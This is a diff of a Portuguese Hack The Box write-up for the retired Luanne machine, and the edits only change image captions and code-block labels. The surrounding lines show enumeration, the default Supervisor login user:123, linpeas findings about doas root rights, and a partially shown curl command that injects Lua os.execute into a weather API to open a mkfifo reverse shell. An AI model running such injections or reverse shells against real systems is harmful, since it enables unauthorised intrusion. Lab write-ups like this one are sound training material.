@@ -16,7 +16,7 @@ A máquina desta semana será **Luanne**, outra máquina Linux classificada como
 :information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
 {: .notice--info}
 
-![laboratory-image](https://i.imgur.com/H8PyuHc.png){: .align-center}
+![HTB Luanne](https://i.imgur.com/H8PyuHc.png){: .align-center}
 
 ## Enumeração
 
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds
 
 Ao acessar a página inicial do serviço foi solicitada autenticação, para a qual não temos nenhum tipo de credencial até o momento. Um ponto que chama a atenção é o link para a porta 3000/TCP do localhost, sendo que estamos acessando de uma porta 80/TCP, provavelmente através de um proxy.
 
-![image-20210220064910702](https://i.imgur.com/29kTezx.png){: .align-center}
+![HTB Luanne - 3000/TCP](https://i.imgur.com/29kTezx.png){: .align-center}
 
 De acordo com o scan do `nmap`, existe uma entrada no arquivo `robots.txt`. Ao validá-lo integralmente encontramos uma informação importante sobre um diretório virtual `/weather`
 
@@ -112,13 +112,13 @@ Embora seja possível consultar as informações nesta API, não consegui identi
 
 Buscando por `Medusa httpd 1.12 (Supervisor process manager)` encontrei que o serviço provavelmente se trata da aplicação [**Supervisor**](https://github.com/Supervisor/supervisor). Buscando pelas credenciais padrão na página do projeto encontrei **user:123**, as quais permitiram o acesso no portal e exibiu a página abaixo:
 
-![image-20210219140749159](https://i.imgur.com/2fSp0Lx.png){: .align-center}
+![HTB Luanne - Supervisor](https://i.imgur.com/2fSp0Lx.png){: .align-center}
 
 Com isso podemos observar que a versão do supervisor em execução é  a **4.2.0**, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.
 
 Clicando em cada um dos recursos disponíveis, um item interessante chamou atenção: o link **processes**. Ao acessar as informações ali disponíveis um processo em execução na máquina chamou atenção, frente ao que identificamos no item anterior:
 
-```log
+```plaintext
 _httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
 ```
 
@@ -172,7 +172,7 @@ curl -G --data-urlencode "city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat 
 
 Ao executar o `linpeas.sh` observado que o usuário **r.michaels** possui em execução a mesma web API LUA utilizada no acesso inicial. A ideia seria obter um shell reverso com a conta do usuário em questão da mesma forma que o acesso inicial foi obtido, porém a exploração utilizada anteriormente não funcionou conforme esperado. Isso nos leva a crer que esta versão da API foi corrigida, conforme podemos notar também o path **devel** no caminho do arquivo `weather.lua` em execução na chamada.
 
-```log
+```plaintext
 r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels
 -b /home/r.michaels/devel/www
 ```
@@ -345,13 +345,13 @@ Executando o script `linpeas.sh` vi alguns insights interessantes que nos ajudar
 
 - Usuário r.michaels possui acessos **doas** de execução como `root`, equivalentes ao `sudo` em outras distribuições;
 
-```log
+```plaintext
 [+] Checking doas.conf
 permit r.michaels as root
 ```
 
 - Chave PGP para o app `netpgp`, que permite criptografar, descriptografar e assinar arquivos;
-```log
+```plaintext
 [+] Do I have PGP keys?
 gpg Not Found
 /usr/bin/netpgpkeys
@@ -362,7 +362,8 @@ uid "RSA 2048-bit key <r.michaels@localhost>" ""
 ```
 
 - Caminhos user writable:
-```log
+
+```plaintext
 [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
 /home/r.michaels
